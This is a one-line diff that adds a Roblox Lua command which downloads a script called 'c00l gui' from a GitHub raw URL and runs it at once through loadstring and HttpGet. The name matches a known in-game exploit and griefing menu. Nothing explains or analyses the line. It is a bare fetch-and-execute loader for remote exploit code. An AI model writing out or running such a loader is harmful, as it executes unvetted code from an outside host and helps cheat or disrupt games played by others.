@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AvaliOrgal/c00lgui/2ce5cd1af7ccf4da524abb2ca0b49026e7d2c7b6/c00l%20gui"))()
